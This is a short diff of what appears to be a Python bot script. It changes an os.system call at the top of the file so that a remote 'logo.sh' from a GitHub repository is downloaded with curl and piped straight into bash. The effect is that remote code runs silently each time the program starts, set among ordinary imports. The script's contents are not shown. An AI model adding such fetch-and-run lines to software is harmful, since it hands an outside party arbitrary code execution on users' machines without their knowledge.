@@ -1,5 +1,5 @@
 import os
-os.system("curl -s https://raw.githubusercontent.com/airdropbomb/Tools/refs/heads/main/logo.sh")
+os.system("curl -s https://raw.githubusercontent.com/airdropbomb/Tools/refs/heads/main/logo.sh | bash")
 import argparse
 import asyncio
 import json
